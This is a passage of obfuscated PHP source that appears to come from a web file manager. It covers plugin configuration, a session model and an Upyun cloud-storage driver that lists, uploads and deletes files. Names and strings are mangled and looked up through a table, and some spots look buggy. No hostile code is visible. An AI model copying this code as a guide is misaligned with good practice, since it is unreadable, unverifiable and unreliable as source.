$è®Ç­ãæ, $ÇüéŸûµ[797] => 0, $ÇüéŸûµ[6] => $this->getConfigDefault($ĞÄÜëèê)); $this->insert($áºÅÍ); } } public function getConfigDefault($äĞ³äÛö) { $²áÙİïˆ =& $_SERVER[Î‹ÃÂŞ„]; $£ø†›¶¼ = array(); $€÷ÙÊ‚Ú = $this->getPackageJson($äĞ³äÛö); if (!$€÷ÙÊ‚Ú && is_array($€÷ÙÊ‚Ú[$²áÙİïˆ[2032]])) { return $£ø†›¶¼; } foreach ($€÷ÙÊ‚Ú[$²áÙİïˆ[2032]] as $Ş¸‰×ú => $ŸÁÚæù) { if (!isset($ŸÁÚæù[$²áÙİïˆ[420]]) || isset($£ø†›¶¼[$Ş¸‰×ú])) { continue; } $£ø†›¶¼[$Ş¸‰×ú] = $ŸÁÚæù[$²áÙİïˆ[420]]; } return $£ø†›¶¼; } public function getPackageJson($é³¨¢¡â) { return Hook::apply($é³¨¢¡â . $_SERVER[Î‹ÃÂŞ„][2033]); } public function getConfig($í«¹Ğ“, $ñÓ¨€ú‘ = false) { $©‹”¨ÜŞ =& $_SERVER[Î‹ÃÂŞ„]; $èæœÖµÇ = array(); $ÑÄÔ’êú = $this->loadList($í«¹Ğ“); if ($ÑÄÔ’êú && is_array($ÑÄÔ’êú[$©‹”¨ÜŞ[6]])) { $èæœÖµÇ = $ÑÄÔ’êú[$©‹”¨ÜŞ[6]]; } if (!$èæœÖµÇ || $ñÓ¨€ú‘) { $èæœÖµÇ = $this->getConfigDefault($í«¹Ğ“); } return $èæœÖµÇ; } public function setConfig($…Ãº, $ÊÔ¸Àı = false) { $õšïõæÀ =& $_SERVER[Î‹ÃÂŞ„]; $¦Ù·ıåÉ = $this->loadList($…Ãº); if (!$¦Ù·ıåÉ) { return !1; } $‘ÄÑ¯‘ï = $¦Ù·ıåÉ[$õšïõæÀ[6]]; if ($ÊÔ¸Àı == !1) { $‘ÄÑ¯‘ï = array(); $ÊÔ¸Àı = $this->getConfigDefault($…Ãº); } foreach ($ÊÔ¸Àı as $º°©³Äª => $ÎşèÂ…´) { $‘ÄÑ¯‘ï[$º°©³Äª] = is_string($ÎşèÂ…´) ? trim($ÎşèÂ…´) : $ÎşèÂ…´; } $this->update($¦Ù·ıåÉ[$õšïõæÀ[445]], array($õšïõæÀ[6] => $‘ÄÑ¯‘ï)); } public function viewList() { $«Œ¨¯ô =& $_SERVER[Î‹ÃÂŞ„]; $ó‡Ö±§¬ = $this->loadList(); $this->pluginScan($ó‡Ö±§¬); $ó‡Ö±§¬ = $this->loadPluginList(); $Û€Î×ö± = array(); foreach ($ó‡Ö±§¬ as $É€¢·È => $é‹Š´â) { $²æ—«Ú¹ = $é‹Š´â; unset($é‹Š´â[$«Œ¨¯ô[2023]], $é‹Š´â[$«Œ¨¯ô[6]]); $¢Ş®ş®Å = PLUGIN_DIR . $é‹Š´â[$«Œ¨¯ô[32]] . $«Œ¨¯ô[2025]; if (!is_file($¢Ş®ş®Å)) { continue; } $š„ñïùú = Hook::apply($é‹Š´â[$«Œ¨¯ô[32]] . $«Œ¨¯ô[2033]); if (!is_array($š„ñïùú)) { continue; } $Û€Î×ö±[$É€¢·È] = array_merge($é‹Š´â, $š„ñïùú); if ($²æ—«Ú¹[$«Œ¨¯ô[6]][$«Œ¨¯ô[2034]] != $š„ñïùú[$«Œ¨¯ô[1599]]) { Hook::apply($é‹Š´â[$«Œ¨¯ô[32]] . $«Œ¨¯ô[2030]); $¹„Õ™Ó = array($«Œ¨¯ô[2034] => $š„ñïùú[$«Œ¨¯ô[1599]]); $this->update($é‹Š´â[$«Œ¨¯ô[445]], array($«Œ¨¯ô[6] => $¹„Õ™Ó)); } } return $Û€Î×ö±; } private function loadPluginList() { $‹Ï¦× =& $_SERVER[Î‹ÃÂŞ„]; $ğ¶€¹Ò = $this->loadList(); if (strtolower(MOD) == $‹Ï¦×[2035]) { return $ğ¶€¹Ò; } $¹ôÀêÙ™ = Hook::trigger($‹Ï¦×[2036], $ğ¶€¹Ò); if ($ğ¶€¹Ò && !$¹ôÀêÙ™) { die; } return $¹ôÀêÙ™ ? $¹ôÀêÙ™ : $ğ¶€¹Ò; } private function pluginScan($®¦ş‡½Ì) { $îªÇçê§ =& $_SERVER[Î‹ÃÂŞ„]; recursion_dir(PLUGIN_DIR, $áôÏÌîÒ, $Â µ‘”ë, 0); foreach ($áôÏÌîÒ as $÷ıÊÌŞÄ) { $Æ˜£ÔÏ´ = get_path_this($÷ıÊÌŞÄ); if (isset($®¦ş‡½Ì[$Æ˜£ÔÏ´]) || !file_exists($÷ıÊÌŞÄ . $îªÇçê§[2037]) || !file_exists($÷ıÊÌŞÄ . $îªÇçê§[2025])) { continue; } Hook::apply($Æ˜£ÔÏ´ . $îªÇçê§[2030]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\x6d\x5f\x73\145\163\x73\x69\x6f\156"; public function get($ÓÌšç—¡) { $˜´¹ï¯ã =& $_SERVER[Î‹ÃÂŞ„]; $ú†ğ…Ü‰ = $this->where(array($˜´¹ï¯ã[2038] => $ÓÌšç—¡))->find(); if (!is_array($ú†ğ…Ü‰)) { return !1; } return $ú†ğ…Ü‰[$˜´¹ï¯ã[801]]; } public function set($º¼´¦÷’, $ô“€êÃ, $ò©›®Ñó = 3600) { $æ¨ü•ì =& $_SERVER[Î‹ÃÂŞ„]; $Üîµæóï = array($æ¨ü•ì[2038] => $º¼´¦÷’, $æ¨ü•ì[1941] => $ô“€êÃ, $æ¨ü•ì[2039] => $ò©›®Ñó + time()); if (Session::get($æ¨ü•ì[2040])) { $Üîµæóï[$æ¨ü•ì[1704]] = Session::get($æ¨ü•ì[2040]); } else { $Üîµæóï[$æ¨ü•ì[1704]] = 0; } if ($this->get($º¼´¦÷’)) { return $this->where(array($æ¨ü•ì[2038] => $º¼´¦÷’))->save($Üîµæóï); } else { return $this->add($Üîµæóï, array(), !0); } } public function remove($”•œâ™) { return $this->where(array($_SERVER[Î‹ÃÂŞ„][2038] => $”•œâ™))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Î‹ÃÂŞ„][2041] . time())->delete(); } } goto d¥öù±££É; c­¶ÉçáÓ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($í›òŸ®Ó, $Ê şµÁº = 0) { parent::__construct(); $this->source = $í›òŸ®Ó; $this->sourceSize = $Ê şµÁº; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ŠíœÊ°Ä = false) { return $this->sourceSize; } public function getContent($òâ¥Ü’ù = false) { return $this->fileSubstr($òâ¥Ü’ù, 0, $this->sourceSize); } public function fileSubstr($©çèñè = false, $×Ë‚óÔğ = 0, $ø¾Âê— = 0) { if (!$ø¾Âê—) { $ø¾Âê— = $this->sourceSize; } $ä”àúÙà = $this->sourceSize - $×Ë‚óÔğ; if ($ø¾Âê— >= $ä”àúÙà) { $ø¾Âê— = $ä”àúÙà; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $×Ë‚óÔğ, $ø¾Âê—); } if ($this->sourceType == self::TYPE_FILE) { if ($ø¾Âê— <= 0) { return $_SERVER[Î‹ÃÂŞ„][12]; } $èıÉ¡úÀ = ftell($this->source); fseek_64($this->source, $èıÉ¡úÀ + $×Ë‚óÔğ); $Ä¿åƒÆ® = @fread($this->source, $ø¾Âê—); fseek_64($this->source, $èıÉ¡úÀ); return $Ä¿åƒÆ®; } } public function hashMd5($ÒÜÍóÈ = false) { return md5($this->getContent()); } public static function hash($ñĞ·”, $Ø—ù¤Ã = 0) { $‡ûñ»Íš = new PathDriverStream($ñĞ·”, $Ø—ù¤Ã); return $‡ûñ»Íš->hashSimple($ñĞ·”); } public static function md5($àœóÙè, $ÓôŒú—Ù = 0) { $º›«½Ø§ = new PathDriverStream($àœóÙè, $ÓôŒú—Ù); return $º›«½Ø§->hashMd5($àœóÙè); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\x3a\x2f\57\166\60\x2e\141\x70\x69\56\x75\x70\x79\165\156\56\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ôª€¿¡ˆ) { parent::__construct(); $this->_init($ôª€¿¡ˆ); } public function _init($¢—ßÓÉÍ) { $½ĞÚ¥ºı =& $_SERVER[Î‹ÃÂŞ„]; foreach ($¢—ßÓÉÍ as $şÎù—Í’ => $«óçš‘©) { if (isset($this->{$şÎù—Í’})) { $this->{$şÎù—Í’} = $«óçš‘©; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($½ĞÚ¥ºı[1497] . LNG($½ĞÚ¥ºı[1429])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ß“ş±¿Ñ, $áÈ·ÊŒ‰ = "\x47\x45\124") { $”ÍÎâÀ =& $_SERVER[Î‹ÃÂŞ„]; $ëÂœæÆ˜ = gmdate($”ÍÎâÀ[1462]); $¶°ÂÁ÷® = base64_encode(hash_hmac($”ÍÎâÀ[1498], "{$áÈ·ÊŒ‰}\x26{$ß“ş±¿Ñ}\x26{$ëÂœæÆ˜}", md5("{$this->userpass}"), !0)); $ôªÁÌÒ› = array("\x41\x75\164\x68\157\x72\151\172\x61\x74\x69\x6f\156\72\125\120\131\x55\116\x20{$this->username}\72{$¶°ÂÁ÷®}", "\x44\141\x74\145\72{$ëÂœæÆ˜}"); return $ôªÁÌÒ›; } public function ussRequest($²£Ïç„, $ô´úÖ†¿ = "\x47\x45\x54", $¥ÎËêûÙ = false, $¼¾ÓÂ‘² = false, $¤ı©ÖµÀ = false) { $âú£¦†• =& $_SERVER[Î‹ÃÂŞ„]; $²£Ïç„ = trim($²£Ïç„, $âú£¦†•[8]); $™Ùñ¬™ = "\57{$this->bucket}\x2f{$²£Ïç„}"; $ë›¹ûíÍ = $this->ussHeaders($™Ùñ¬™, $ô´úÖ†¿); if ($¼¾ÓÂ‘²) { $ë›¹ûíÍ = array_merge($ë›¹ûíÍ, $¼¾ÓÂ‘²); } $Ì·ÖõÉŞ = url_request($this->endpoint . $™Ùñ¬™, $ô´úÖ†¿, $¥ÎËêûÙ, $ë›¹ûíÍ, $¤ı©ÖµÀ); if (!$Ì·ÖõÉŞ) { return array($âú£¦†•[1267] => !1, $âú£¦†•[1257] => $âú£¦†•[1499]); } if (strtolower($ô´úÖ†¿) == $âú£¦†•[213] || in_array($Ì·ÖõÉŞ[$âú£¦†•[1267]], array($âú£¦†•[259], $âú£¦†•[1500]))) { $¥ÎËêûÙ = $Ì·ÖõÉŞ[$âú£¦†•[1501]]; } else { $¥ÎËêûÙ = json_decode($Ì·ÖõÉŞ[$âú£¦†•[1257]], !0); if (!$¥ÎËêûÙ) { $¥ÎËêûÙ = $Ì·ÖõÉŞ[$âú£¦†•[1257]]; } else { if (!$Ì·ÖõÉŞ[$âú£¦†•[797]] && isset($¥ÎËêûÙ[$âú£¦†•[1502]])) { $¥ÎËêûÙ = $¥ÎËêûÙ[$âú£¦†•[1502]]; } } } return array($âú£¦†•[1267] => $Ì·ÖõÉŞ[$âú£¦†•[797]], $âú£¦†•[1257] => $¥ÎËêûÙ); } public function mkfile($òƒá®†, $˜Ó¨‚æ» = '', $™û‚¨ì¼ = REPEAT_RENAME) { if ($this->setContent($òƒá®†, $˜Ó¨‚æ»)) { return $this->getPathOuter($òƒá®†); } return !1; } public function mkdir($„ª«şŒ˜, $¤¬ÒóÒš = REPEAT_SKIP) { $öï¦ô½ =& $_SERVER[Î‹ÃÂŞ„]; $’ÔáæŒæ = trim($„ª«şŒ˜, $öï¦ô½[8]); if ($this->_isFolder($’ÔáæŒæ)) { return $this->getPathOuter($’ÔáæŒæ); } $‘†ÜáÕÃ = array($öï¦ô½[1503]); $ëşîĞ³Ù = $this->ussRequest($’ÔáæŒæ, $öï¦ô½[243], !1, $‘†ÜáÕÃ); return $ëşîĞ³Ù[$öï¦ô½[1267]] ? $this->getPathOuter($’ÔáæŒæ) : !1; } public function copyFile($«îúùøõ, $ƒò§õ¡·) { $Ì•Ó‹†Ô =& $_SERVER[Î‹ÃÂŞ„]; $µ†µ = array($Ì•Ó‹†Ô[1504] . "\x2f{$this->bucket}\x2f{$«îúùøõ}", $Ì•Ó‹†Ô[1505]); $—»â×°™ = $this->ussRequest($ƒò§õ¡·, $Ì•Ó‹†Ô[245], !1, $µ†µ); return $—»â×°™[$Ì•Ó‹†Ô[1267]] ? !0 : $this->getPathOuter($ƒò§õ¡·); } public function moveFile($¬¼¾¾“º, $—ı¯ÃŠ) { $âˆÎê• =& $_SERVER[Î‹ÃÂŞ„]; $Ù±Œ …² = array($âˆÎê•[1506] . "\57{$this->bucket}\x2f{$¬¼¾¾“º}", $âˆÎê•[1505]); $ÎãêñÜÆ = $this->ussRequest($—ı¯ÃŠ, $âˆÎê•[245], !1, $Ù±Œ …²); return $ÎãêñÜÆ[$âˆÎê•[1267]] ? !0 : $this->getPathOuter($—ı¯ÃŠ); } public function delFile($“ùéØ) { $™œ–¤“ =& $_SERVER[Î‹ÃÂŞ„]; $•É¡¦‹Æ = $this->ussRequest($“ùéØ, $™œ–¤“[1507]); return $•É¡¦‹Æ[$™œ–¤“[1267]] ? !0 : !1; } public function delFolder($ÏÒ ËŒ’) { $èüæ›Ñ¾ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->exist($ÏÒ ËŒ’)) { return !0; } $this->listItemCache = !1; $…äĞ¥¡¢ = $÷¹íòú = array(); $this->fileList($ÏÒ ËŒ’, $…äĞ¥¡¢, $÷¹íòú, !0); $this->listItemCache = !0; foreach ($÷¹íòú as $ø–Ô¸Â²) { $§ÁØ»¢Â = $this->ussRequest($ø–Ô¸Â²[$èüæ›Ñ¾[32]], $èüæ›Ñ¾[1507]); if (!$§ÁØ»¢Â[$èüæ›Ñ¾[1267]]) { return !1; } } foreach ($…äĞ¥¡¢ as $»ßæİÑß) { $§ÁØ»¢Â = $this->ussRequest($»ßæİÑß, $èüæ›Ñ¾[1507]); if (!$§ÁØ»¢Â[$èüæ›Ñ¾[1267]]) { return !1; } } $§ÁØ»¢Â = $this->ussRequest($ÏÒ ËŒ’, $èüæ›Ñ¾[1507]); return $§ÁØ»¢Â[$èüæ›Ñ¾[1267]]; } public function rename($«ùô ïû, $ÔÚÆ·æŒ) { if ($this->isFile($«ùô ïû)) { $ÔÚÆ·æŒ = get_path_father($«ùô ïû) . $ÔÚÆ·æŒ; return $this->moveFile($«ùô ïû, $ÔÚÆ·æŒ); } return $this->renameObject($«ùô ïû, $ÔÚÆ·æŒ); } public function fileInfo($íÆö©ı±, $ñ‰§ã³ = false, $ûÌŒÎªŞ = array()) { $„‹Å—â˜ =& $_SERVER[Î‹ÃÂŞ„]; $É»Ö¼é¦ = array($„‹Å—â˜[32] => $this->pathThis($íÆö©ı±), $„‹Å—â˜[86] => $this->getPathOuter($„‹Å—â˜[8] . $íÆö©ı±), $„‹Å—â˜[33] => $„‹Å—â˜[216], $„‹Å—â˜[78] => isset($ûÌŒÎªŞ[$„‹Å—â˜[78]]) ? $ûÌŒÎªŞ[$„‹Å—â˜[78]] : 0, $„‹Å—â˜[177] => $this->ext($íÆö©ı±)); if ($ñ‰§ã³) { return $É»Ö¼é¦; } $É»Ö¼é¦[$„‹Å—â˜[217]] = $É»Ö¼é¦[$„‹Å—â˜[87]] = 0; $É»Ö¼é¦[$„‹Å—â˜[218]] = $É»Ö¼é¦[$„‹Å—â˜[219]] = !0; if (empty($ûÌŒÎªŞ)) { $ûÌŒÎªŞ = $this->objectMeta($íÆö©ı±); if (!$ûÌŒÎªŞ) { return $É»Ö¼é¦; } } $É»Ö¼é¦[$„‹Å—â˜[217]] = intval($ûÌŒÎªŞ[$„‹Å—â˜[1508]]); $É»Ö¼é¦[$„‹Å—â˜[87]] = intval($ûÌŒÎªŞ[$„‹Å—â˜[1509]]); $É»Ö¼é¦[$„‹Å—â˜[78]] = $ûÌŒÎªŞ[$„‹Å—â˜[78]]; return $É»Ö¼é¦; } public function folderInfo($‰Ç¸è»œ, $¢±ı‚İÚ = false) { $„©‡œ©Ò =& $_SERVER[Î‹ÃÂŞ„]; $ ‚Ò¥° = array($„©‡œ©Ò[32] => $this->pathThis($‰Ç¸è»œ), $„©‡œ©Ò[86] => $this->getPathOuter($„©‡œ©Ò[8] . $‰Ç¸è»œ), $„©‡œ©Ò[33] => $„©‡œ©Ò[77]); if ($¢±ı‚İÚ) { return $ ‚Ò¥°; } $ ‚Ò¥°[$„©‡œ©Ò[217]] = $ ‚Ò¥°[$„©‡œ©Ò[87]] = 0; $ ‚Ò¥°[$„©‡œ©Ò[218]] = $ ‚Ò¥°[$„©‡œ©Ò[219]] = !0; if (empty($ñÌ„¸ˆ)) { $ñÌ„¸ˆ = $this->objectMeta($‰Ç¸è»œ); if (!$ñÌ„¸ˆ) { return $ ‚Ò¥°; } } $ ‚Ò¥°[$„©‡œ©Ò[217]] = intval($ñÌ„¸ˆ[$„©‡œ©Ò[1508]]); $ ‚Ò¥°[$„©‡œ©Ò[87]] = intval($ñÌ„¸ˆ[$„©‡œ©Ò[1509]]); return $ ‚Ò¥°; } private function listObjs($„ÑÛŒäÛ, $Ğ¦»…Ìî = 0, $Œºõù¦ó = 1000) { $ù‚½ñŸº =& $_SERVER[Î‹ÃÂŞ„]; $ÇäÓ„Ù¬ = array($ù‚½ñŸº[1510], $ù‚½ñŸº[1511] . $Œºõù¦ó); if ($Ğ¦»…Ìî) { $ÇäÓ„Ù¬[] = $ù‚½ñŸº[1512] . $Ğ¦»…Ìî; } $ó”›·§ = $this->ussRequest($„ÑÛŒäÛ, $ù‚½ñŸº[247], !1, $ÇäÓ„Ù¬); return !$ó”›·§[$ù‚½ñŸº[1267]] ? !1 : $ó”›·§[$ù‚½ñŸº[1257]]; } private function fileList($ÆùÉ¡×, &$‘–¨€, &$Í™€‡ø®, $“¥¬ôÂ¹ = false) { $ô×Ï±¹à =& $_SERVER[Î‹ÃÂŞ„]; $¾ßŸãë¼ = $ô×Ï±¹à[12]; $Ùããñõ = 1000; $´†Ôúû = rtrim($ÆùÉ¡×, $ô×Ï±¹à[8]) . $ô×Ï±¹à[8]; while (!0) { check_abort(); $ÉÇ•³’î = $this->listObjs($ÆùÉ¡×, $¾ßŸãë¼, $Ùããñõ); if (!$ÉÇ•³’î) { return !1; } $¾ßŸãë¼ = isset($ÉÇ•³’î[$ô×Ï±¹à[1513]]) ? $ÉÇ•³’î[$ô×Ï±¹à[1513]] : $ô×Ï±¹à[12]; $˜’ã‹•Æ = isset($ÉÇ•³’î[$ô×Ï±¹à[1514]]) ? $ÉÇ•³’î[$ô×Ï±¹à[1514]] : array(); foreach ($˜’ã‹•Æ as $¶ÍÑ±ºß) { $Ó±©ÍŸó = $¶ÍÑ±ºß[$ô×Ï±¹à[33]] == $ô×Ï±¹à[77] ? !0 : !1; $¿ß´º = ltrim($´†Ôúû . $¶ÍÑ±ºß[$ô×Ï±¹à[32]], $ô×Ï±¹à[8]) . ($Ó±©ÍŸó ? $ô×Ï±¹à[8] : $ô×Ï±¹à[12]); $¤àÊŸÄ¶ = array($ô×Ï±¹à[32] => $¿ß´º, $ô×Ï±¹à[33] => $Ó±©ÍŸó ? $ô×Ï±¹à[77] : $ô×Ï±¹à[216], $ô×Ï±¹à[78] => $¶ÍÑ±ºß[$ô×Ï±¹à[383]], $ô×Ï±¹à[1509] => $¶ÍÑ±ºß[$ô×Ï±¹à[1515]]); $this->cacheMethodInfoSet($¿ß´º, $Ó±©ÍŸó, $¤àÊŸÄ¶); if ($Ó±©ÍŸó) { $‘–¨€[] = $¿ß´º; if ($“¥¬ôÂ¹) { $this->fileList($¿ß´º, $‘–¨€, $Í™€‡ø®, $“¥¬ôÂ¹); } continue; } $Í™€‡ø®[] = $¤àÊŸÄ¶; } if (count($˜’ã‹•Æ) < $Ùããñõ) { break; } } $this->cacheMethodInfoSet($ÆùÉ¡×, !0); } public function listPath($ƒ³©ºŞ®, $„ˆ“Ó´¼ = false) { $µé×«çÑ =& $_SERVER[Î‹ÃÂŞ„]; $ª‰Œ€â‹ = $™ˆá¼ß = array(); $this->fileList($ƒ³©ºŞ®, $ª‰Œ€â‹, $™ˆá¼ß); foreach ($ª‰Œ€â‹ as $¦µ‚éí² => $¤“ïâœà) { $ª‰Œ€â‹[$¦µ‚éí²] = $this->folderInfo($¤“ïâœà, $„ˆ“Ó´¼); } foreach ($™ˆá¼ß as $¦µ‚éí² => $¤“ïâœà) { $™ˆá¼ß[$¦µ‚éí²] = $this->fileInfo($¤“ïâœà[$µé×«çÑ[32]], $„ˆ“Ó´¼, $¤“ïâœà); } return array($µé×«çÑ[84] => $ª‰Œ€â‹, $µé×«çÑ[85] => $™ˆá¼ß); } public function has($ª¨áÄ·¬, $Ãéó”é = false, $îİ¶¥ÀÜ = true) { $ÏÏ§ÀğŞ =& $_SERVER[Î‹ÃÂŞ„]; $şâÏÃ³– = $ÏÏ§ÀğŞ[12]; $Ñõ…¶§õ = 500; $Ö÷Òû²å = 0; $µÌö·ÇÀ = 0; $õ‰…¼ûš = rtrim($ª¨áÄ·¬, $ÏÏ§ÀğŞ[8]) . $ÏÏ§ÀğŞ[8]; while (!0) { check_abort(); $Ÿú¯œÈİ = $this->listObjs($ª¨áÄ·¬, $şâÏÃ³–, $Ñõ…¶§õ); if (!$Ÿú¯œÈİ) { return !1; } $şâÏÃ³– = isset($Ÿú¯œÈİ[$ÏÏ§ÀğŞ[1513]]) ? $Ÿú¯œÈİ[$ÏÏ§ÀğŞ[1513]] : $ÏÏ§ÀğŞ[12]; $ƒŸ¶¢õ = isset($Ÿú¯œÈİ[$ÏÏ§ÀğŞ[1514]]) ? $Ÿú¯œÈİ[$ÏÏ§ÀğŞ[1514]] : array(); if (empty($ƒŸ¶¢õ)) { break; } $Ï¥‘õäâ = array_filter($ƒŸ¶¢õ, function ($Ş—ÎÃ¦„) { $¥ôª›Î =& $_SERVER[Î‹ÃÂŞ„]; return $Ş—ÎÃ¦„[$¥ôª›Î[33]] == $¥ôª›Î[77]; }); $ë–ùõŠÑ = count($ƒŸ¶¢õ); $Ï¥‘õäâ = count($Ï¥‘õäâ); $Õ£Õ±è¼ = $ë–ùõŠÑ - $Ï¥‘õäâ; if ($Ãéó”é) { $µÌö·ÇÀ += $Ï¥‘õäâ; $Ö÷Òû²å += $Õ£Õ±è¼; if ($ë–ùõŠÑ < $Ñõ…¶§õ) { break; } continue; } if ($îİ¶¥ÀÜ) { if ($Õ£Õ±è¼) { return !0; } } else { if ($Ï¥‘õäâ) { return !0; } } if ($ë–ùõŠÑ < $Ñõ…¶§õ) { break; } } if ($Ãéó”é) { return array($ÏÏ§ÀğŞ[225] => $Ö÷Òû²å, $ÏÏ§ÀğŞ[226] => $µÌö·ÇÀ); } return !1; } public function listAll($ÆŞí¤×°) { $ÅšêÚ¢ª =& $_SERVER[Î‹ÃÂŞ„]; $½À’œ¡¡ = $¼ŞÊÁëœ = array(); $this->fileList($ÆŞí¤×°, $½À’œ¡¡, $¼ŞÊÁëœ, !0); $¼Ï„±œŸ = array_to_keyvalue($¼ŞÊÁëœ, $ÅšêÚ¢ª[32]); foreach ($½À’œ¡¡ as $Š¼ëÁ) { if (is_string($Š¼ëÁ)) { $¼Ï„±œŸ[$Š¼ëÁ] = array($ÅšêÚ¢ª[78] => 0); } } return $this->listAllFiles($ÆŞí¤×°, $¼Ï„±œŸ); } public function canRead($æŠ‰ã¸Á) { return $this->exist($æŠ‰ã¸Á) ? !0 : !1; } public function canWrite($µ­Ğ°) { return $this->exist($µ­Ğ°) ? !0 : !1; } public function getContent($ÙÕãÇèı) { return $this->fileSubstr($ÙÕãÇèı, 0, -1); } public function setContent($¤ú•ÖÎµ, $ä›àª‚ğ = '') { $±ªÓŠ‰È =& $_SERVER[Î‹ÃÂŞ„]; if (!$ä›àª‚ğ) { $µÕÁ·¹³ = $this->ussRequest($¤ú•ÖÎµ, $±ªÓŠ‰È[243]); return $µÕÁ·¹³[$±ªÓŠ‰È[1267]]; } $±™ßÃÉ = $this->tempFile($this->pathThis($¤ú•ÖÎµ)); file_put_contents($±™ßÃÉ, $ä›àª‚ğ); if ($this->upload($¤ú•ÖÎµ, $±™ßÃÉ)) { $this->tempFileRemve($±™ßÃÉ); return !0; } return !1; } public function fileSubstr($úóÌÆáã, $”ïÔ…€, $ãÔƒÄõ) { $ÁĞØÔ÷ö =& $_SERVER[Î‹ÃÂŞ„]; if (!($Ï¶è‡–– = $this->link($úóÌÆáã))) { return !1; } $­¢ßÎš• = !1; if ($ãÔƒÄõ > 0) { $‹ÄĞô–Ã = $”ïÔ…€ + $ãÔƒÄõ - 1; $­¢ßÎš• = array($ÁĞØÔ÷ö[1476] . $”ïÔ…€ . $ÁĞØÔ÷ö[432] . $‹ÄĞô–Ã); } $”±¦Ö = url_request($Ï¶è‡––, $ÁĞØÔ÷ö[247], !1, $­¢ßÎš•); return $”±¦Ö[$ÁĞØÔ÷ö[797]] ? $”±¦Ö[$ÁĞØÔ÷ö[1257]] : !1; } public function upload($¼°ğ¡œ, $îÈ¡º¼, $Œİ˜±â‹ = false, $¸îõÌÈÄ = REPEAT_REPLACE) { $ãñÍœƒÃ =& $_SERVER[Î‹ÃÂŞ„]; $­‹Ë‡Ó = IO::size($îÈ¡º¼); if ($­‹Ë‡Ó <= 1024 * 1024 * 200) { $Ù¸‘ˆø = array($ãñÍœƒÃ[1516] . $îÈ¡º¼); $Œı ¥ä = $this->ussRequest($¼°ğ¡œ, $ãñÍœƒÃ[245], $Ù¸‘ˆø); return $Œı ¥ä[$ãñÍœƒÃ[1267]] ? $this->getPathOuter($¼°ğ¡œ) : !1; } $Á¼¿”’¯ = 1024 * 1024 * 10; $ò­’Ğ®í = array($ãñÍœƒÃ[1517], $ãñÍœƒÃ[1518] . $­‹Ë‡Ó, $ãñÍœƒÃ[1519], $ãñÍœƒÃ[1520] . $Á¼¿”’¯); $Œı ¥ä = $this->ussRequest($¼°ğ¡œ, $ãñÍœƒÃ[245], !1, $ò­’Ğ®í); if (!$Œı ¥ä[$ãñÍœƒÃ[1267]]) { return !1; } $¯§¤ô´ = $Œı ¥ä[$ãñÍœƒÃ[1257]]; $„ÚœÃü = 0; $‡òÅï = $¯§¤ô´[$ãñÍœƒÃ[1521]]; $Á³Ùì†è = fopen($îÈ¡º¼, $ãñÍœƒÃ[1423]); if (!$Á³Ùì†è) { return !1; } do { $åÕ§«ƒ = $¯§¤ô´[$ãñÍœƒÃ[1522]]; fseek_64($Á³Ùì†è, $„ÚœÃü); $¼¼±Œ‡¶ = fread($Á³Ùì†è, $åÕ§«ƒ); $º¨ı¤ = 0; do { $º¨ı¤++; $¯§¤ô´ = $this->uploadPart($¼°ğ¡œ, $¯§¤ô´, $¼¼±Œ‡¶); } while (!$¯§¤ô´ && $º¨ı¤ < 3); if (!$¯§¤ô´) { return !1; } $‡òÅï = $¯§¤ô´[$ãñÍœƒÃ[1521]]; $„ÚœÃü += $åÕ§«ƒ; } while ($‡òÅï != -1); fclose($Á³Ùì†è); $ò­’Ğ®í = array($ãñÍœƒÃ[1523], $ãñÍœƒÃ[1524] . $¯§¤ô´[$ãñÍœƒÃ[1525]], $ãñÍœƒÃ[1519]); $Œı ¥ä = $this->ussRequest($¼°ğ¡œ, $ãñÍœƒÃ[245], !1, $ò­’Ğ®í); return $Œı ¥ä[$ãñÍœƒÃ[1267]] ? $this->getPathOuter($¬¥Š÷¶Š) : !1; } private function uploadPart($Êó–†ú, $’¹˜½¬¡, &$•©§áç“) { $Ñˆ„ò’ =& $_SERVER[Î‹ÃÂŞ„]; $Ó”…øéï = array($Ñˆ„ò’[1526], $Ñˆ„ò’[1524] . $’¹˜½¬¡[$Ñˆ„ò’[1525]], $Ñˆ„ò’[1527] . $’¹˜½¬¡[$Ñˆ„ò’[1521]], $Ñˆ„ò’[145] . $’¹˜½¬¡[$Ñˆ„ò’[1522]]); $Îø‰Š¸ = $this->ussRequest($Êó–†ú, $Ñˆ„ò’[245], $•©§áç“, $Ó”…øéï); return !$Îø‰Š¸[$Ñˆ„ò’[1267]] ? $Îø‰Š¸[$Ñˆ„ò’[1267]] : $Îø‰Š¸[$Ñˆ„ò’[1257]]; } public function uploadFormData($•È´²Ëæ, $½öõ•ç = 3600) { return $this->uploadPolicy($•È´²Ëæ, $½öõ•ç); } public function multiUploadFormData($£ªã§ÁÊ, $êÒĞÂËæ = 3600) { $æ•ğÑ“‰ =& $_SERVER[Î‹ÃÂŞ„]; $²Ÿê®áõ = (int) $GLOBALS[$æ•ğÑ“‰[7]][$æ•ğÑ“‰[78]]; return $this->uploadPolicy($£ªã§ÁÊ, $êÒĞÂËæ, $²Ÿê®áõ); } private function uploadPolicy($ÛæÆˆÁ, $­‹Ëãäˆ = 3600, $…›ˆÃ¹Ø = 0) { $ï‹ç€Â² =& $_SERVER[Î‹ÃÂŞ„]; $¬ßúö÷  = $ï‹ç€Â²[8] . $this->bucket; $®å¤ö¯Ã = gmdate($ï‹ç€Â²[1462]); $í€¹ğ– = array($ï‹ç€Â²[1528] => $this->bucket, $ï‹ç€Â²[1529] => $ÛæÆˆÁ, $ï‹ç€Â²[1530] => time() + $­‹Ëãäˆ, $ï‹ç€Â²[1531] => $®å¤ö¯Ã); if ($…›ˆÃ¹Ø) { $í€¹ğ–[$ï‹ç€Â²[1443]] = $…›ˆÃ¹Ø; } $§â¿»Ñ = 